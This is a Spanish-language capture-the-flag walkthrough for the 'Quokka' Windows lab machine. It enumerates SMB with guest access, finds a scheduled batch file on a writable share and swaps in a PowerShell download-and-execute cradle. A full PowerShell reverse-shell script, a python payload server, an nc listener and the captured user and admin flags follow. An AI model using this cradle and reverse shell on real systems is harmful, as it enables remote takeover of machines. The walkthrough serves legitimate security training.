---
icon: flag
---

# Quokka (Windows) TheHackersLabs (Principiante)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 18:02 CET
Nmap scan report for 192.168.10.45
Host is up (0.00030s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Portfolio y Noticias Tech de Quokka
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Datacenter 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
49683/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:98:E3:3C (Oracle VirtualBox virtual NIC)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -20m00s, deviation: 34m38s, median: 0s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:98:e3:3c (Oracle VirtualBox virtual NIC)
| smb-os-discovery:
|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)
|   Computer name: WIN-VRU3GG3DPLJ
|   NetBIOS computer name: WIN-VRU3GG3DPLJ\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-03-17T18:03:10+01:00
| smb2-time:
|   date: 2025-03-17T17:03:10
|_  start_date: 2025-03-17T16:49:51

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.08 seconds
```

Vemos que tiene un puerto `80` en el que tiene alojada una pagina web, pero si investigamos no veremos mucho, tambien vemos que tiene un servidor `SMB` por lo que vamos a probar a enumerar usuario o recursos mediante la herramienta `enum4linux`.

## enum4linux

```shell
enum4linux -a <IP>
```

Info:

```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Mar 17 18:06:23 2025

 =========================================( Target Information )=========================================

Target ........... 192.168.10.45
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.10.45 )===========================


[+] Got domain/workgroup name: WORKGROUP


 ===============================( Nbtstat Information for 192.168.10.45 )===============================

Looking up status of 192.168.10.45
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WIN-VRU3GG3DPLJ <00> -         B <ACTIVE>  Workstation Service
	WIN-VRU3GG3DPLJ <20> -         B <ACTIVE>  File Server Service

	MAC Address = 08-00-27-98-E3-3C

 ===================================( Session Check on 192.168.10.45 )===================================


[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
```

Vemos que no nos permite enumerarlo con el usuario vacio, por lo que haremos lo siguiente:

```shell
enum4linux -a -u guest -p "" <IP>
```

Con esto vamos a utilizar el usuario `guest` que suele ser el de por defecto para probar a enumerar el `SMB`.

Info:

```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Mar 17 18:06:49 2025

 =========================================( Target Information )=========================================

Target ........... 192.168.10.45
RID Range ........ 500-550,1000-1050
Username ......... 'guest'
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.10.45 )===========================


[+] Got domain/workgroup name: WORKGROUP


 ===============================( Nbtstat Information for 192.168.10.45 )===============================

Looking up status of 192.168.10.45
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WIN-VRU3GG3DPLJ <00> -         B <ACTIVE>  Workstation Service
	WIN-VRU3GG3DPLJ <20> -         B <ACTIVE>  File Server Service

	MAC Address = 08-00-27-98-E3-3C

 ===================================( Session Check on 192.168.10.45 )===================================


[+] Server 192.168.10.45 allows sessions using username 'guest', password ''


 ================================( Getting domain SID for 192.168.10.45 )================================

Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] EA 10 A7 37 B0 AA E4 DB   2D C1 66 1D 9E 81 71 9A   ...7.... -.f...q.
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

[+] Can't determine if host is part of domain or part of a workgroup


 ==================================( OS information on 192.168.10.45 )==================================


[E] Can't get OS info with smbclient


[+] Got OS info for 192.168.10.45 from srvinfo:
Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] FD 6C 0A 40 41 60 C9 57   51 B9 59 26 1F 9F 84 1E   .l.@A`.W Q.Y&....
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED


 =======================================( Users on 192.168.10.45 )=======================================


[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED



[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED


 =================================( Share Enumeration on 192.168.10.45 )=================================

do_connect: Connection to 192.168.10.45 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Admin remota
	C$              Disk      Recurso predeterminado
	Compartido      Disk
	IPC$            IPC       IPC remota
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 192.168.10.45

//192.168.10.45/ADMIN$	Mapping: DENIED Listing: N/A Writing: N/A
//192.168.10.45/C$	Mapping: DENIED Listing: N/A Writing: N/A
//192.168.10.45/Compartido	Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:

NT_STATUS_NO_SUCH_FILE listing \*
//192.168.10.45/IPC$	Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 192.168.10.45 )===========================


[E] Unexpected error from polenum:



[+] Attaching to 192.168.10.45 using guest

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:192.168.10.45)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: rpc_s_access_denied



[E] Failed to get password policy with rpcclient



 ======================================( Groups on 192.168.10.45 )======================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ==================( Users on 192.168.10.45 via RID cycling (RIDS: 500-550,1000-1050) )==================


[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.


 ===============================( Getting printer info for 192.168.10.45 )===============================

Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 61 CC 24 BC 2C 5E C1 16   57 14 F3 22 83 3C C1 0E   a.$.,^.. W..".<..
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Mon Mar 17 18:06:53 2025
```

Vemos que esta vez si ha funcionado, podemos ver varias cosas interesantes sobre todo que el recurso compartido llamado `Compartido` se puede entrar y escribir, por lo que si intentamos entrar como `anonimo` veremos que nos deja.

## Escalate Privileges

### SMB

```shell
smbclient //<IP>/Compartido -N
```

Si listamos veremos lo siguiente:

```
.                                   D        0  Sun Oct 27 15:54:55 2024
  ..                                  D        0  Sun Oct 27 15:54:55 2024
  Documentación                      D        0  Sun Oct 27 15:33:53 2024
  Logs                                D        0  Sun Oct 27 15:33:54 2024
  Proyectos                           D        0  Sun Oct 27 15:33:54 2024

		7735807 blocks of size 4096. 4827906 blocks available
```

Si nos vamos a la siguiente estructura de carpetas:

```
dir Proyectos\Quokka\Código\
```

Veremos unos archivos interesantes:

```
.                                   D        0  Sun Oct 27 15:58:54 2024
  ..                                  D        0  Sun Oct 27 15:58:54 2024
  index.html                          A       52  Sun Oct 27 15:33:54 2024
  mantenimiento - copia.bat           A     1252  Sun Oct 27 15:41:43 2024
  mantenimiento.bat                   A      343  Sun Oct 27 15:58:54 2024
  README.md                           A       56  Sun Oct 27 15:33:54 2024

		7735807 blocks of size 4096. 4827906 blocks available
```

Si nos descargamos el archivo `mantenimiento.bat` y lo leemos por dentro veremos lo siguiente:

```bat
@echo off
:: Mantenimiento del sistema de copias de seguridad
:: Este script es ejecutado cada minuto

REM Pista: Tal vez haya algo m�s aqu�...

:: Reverse shell a Kali
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex(New-Object Net.WebClient).DownloadString('http://192.168.1.36:8000/shell.ps1')"

:: Fin del script
exit
```

Vemos que se esta ejecutando algun script en el puerto `8000` y en la `IP: 192.168.1.36`, pero no sabemos que hace ese `script`.

Si leemos el otro archivo llamado `mantenimiento - copia.bat` veremos lo siguiente:

```bat
@echo off
:: ------------------------------------------------------------------
:: Mantenimiento del sistema de copias de seguridad
:: Este script es ejecutado cada minuto para mover los archivos de logs
:: Nota: Asegúrate de no modificar este script sin permisos de administrador
:: ------------------------------------------------------------------

:: Pista: Este script se ejecuta con permisos elevados. Seguro que no hay nada más?

REM Mover los archivos de logs a la carpeta de respaldo
echo Moviendo archivos de logs...
move "C:\Logs\*.log" "C:\Backup\OldLogs\"

:: Pista oculta: Si tienes acceso a este script, podrás manipular su comportamiento.
:: Asegúrate de revisar las líneas de comando en detalle. Tal vez haya una forma de aprovechar esta ejecución

REM Verificar el estado del sistema
echo Verificando el estado del sistema...
systeminfo > nul

REM Comprobando si los archivos temporales necesitan limpieza
echo Limpiando archivos temporales...
del /q "C:\Temp\*.*"

REM Pista: Todo parece estar bajo control, pero realmente lo estÃ¡?
REM Este script se ejecuta con permisos de administrador cada minuto. Tal vez haya algo Ãºtil aquÃ­.

:: Fin del script
echo OperaciÃ³n completada.
exit
```

Vemos que esta cogiendo el `shell.ps1` directamente desde cualquier `IP` por lo que vamos a crearnos un codigo para generar una `reverse shell`.

```powershell
$client = New-Object System.Net.Sockets.TCPClient('<IP_ATTACKER>', 4444)
$stream = $client.GetStream()
[byte[]]$buffer = 0..255|%{0}
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0)
{
    $data = (New-Object Text.ASCIIEncoding).GetString($buffer, 0, $i)
    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

Ahora vamos a modificar el `mantenimiento.bat` y dejarlo de la siguiente forma:

```bat
@echo off
:: Mantenimiento del sistema de copias de seguridad
:: Este script es ejecutado cada minuto

REM Pista: Tal vez haya algo m�s aqu�...

:: Reverse shell a Kali
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex(New-Object Net.WebClient).DownloadString('http://<IP_ATTACKER>:8000/shell.ps1')"

:: Fin del script
exit
```

Esto lo subiremos al `SMB` de la siguiente forma:

```shell
cd Proyectos/Quokka/Código
put mantenimiento.bat
```

Ahora vamos abrirnos un servidor de `python3` para que nos coja el archivo `shell.ps1` y seguidamente nos pondremos a la escucha con `nc`.

```shell
python3 -m http.server 8000
```

Ahora nos pondremos a la escucha:

```shell
nc -lvnp <IP> 4444
```

Solo tendremos que esperar cosa de `1` minuto y si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 4444 ...
connect to [192.168.10.47] from (UNKNOWN) [192.168.10.45] 49794
whoami
win-vru3gg3dplj\administrador
PS C:\Windows\system32>
```

Vemos que funciono y seremos el usuario el `administrador` directamente, por lo que leeremos la flag del admin y del usuario (`0mar`).

> user.txt

```
9OWiub9aDwcULNxs4w80W63Jl
```

> admin.txt

```
j9eCpd89VGOscar4nQp8e842mUOb8U
```
